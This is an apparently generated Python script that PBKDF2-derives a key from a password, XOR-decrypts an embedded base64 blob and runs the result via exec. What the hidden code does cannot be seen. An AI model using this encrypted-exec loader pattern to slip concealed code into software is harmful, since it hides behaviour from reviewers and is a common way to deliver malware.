# Obfuscated file (generated)
import base64, sys, os, getpass, hashlib
_b64 = """k5VyutWYkDiknZdChXVwo4iZdBZqUv8hesWHjpBVwOrRwDug1Ie1M6CD11WfIyOqgud1FHQOhzw32pv27hHV4JDZPKbIwpZgx9OYB8tzIrqfmTRbVxiGPHLY0t7IVcDq0cA7oNSHkSm0gMxChit5/9GdcBhwB5o6epuamYgQ0fXVnHTmrMqfeu2Dyk6Fd3jxoYF9DWIOhyUtl8TclBnR8tbbL6KImtM7uZXXVYYrefr7zTxZJBGHIXnBwN60DMTu39pn7YrKzCO+3c5CmXA5vJ/Dbhx0DZQrcp3PoIpSnKGQk3TmrMqfeu2Dyk6Fd3jxoZ9zGmEShidlj8rQxAXc58TSMr3LxM8oopDdVJhsIvvYxBZZJEHVOGXchojMV/3n09w0ocPQnXbtg9RGn2U/oZzDcRhnCZwmcp3B1e5VkKaQxC+myJ6XeIidzk6ZbD6+lINoWXIAhyF214SZl1WY9dHZLaPDw4V45PmYB8sjNryDzXdZbQ/VO3jHnJmAXdzvw8B1oNXE2jS7mspIhS07toieNFAtOs95J+jBxu5VkKaQlH3vhprNM6OHkEHJI3CompAhAmsS2y15w4GOixvr7e3Jf+as4NY87aznSYpuNYyuzSFEJEaqF3rUgZK7Kpe8upR974aH3jOj25Et"""
_salt_hex = "4e4398e83c90fb5da8dee26299a96927"
_iters = 200000

_key = os.environ.get('OBF_KEY')
if not _key:
    if len(sys.argv) > 1:
        _key = sys.argv[1]
    else:
        try:
            _key = getpass.getpass('Password: ')
        except Exception:
            print('Missing key: set OBF_KEY, pass as first arg, or provide via prompt')
            sys.exit(1)

def _xor(data, key_bytes):
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

salt = bytes.fromhex(_salt_hex)
key_bytes = hashlib.pbkdf2_hmac('sha256', _key.encode(), salt, _iters, dklen=32)
code = _xor(base64.b64decode(_b64), key_bytes)
exec(compile(code, '<obfuscated>', 'exec'))
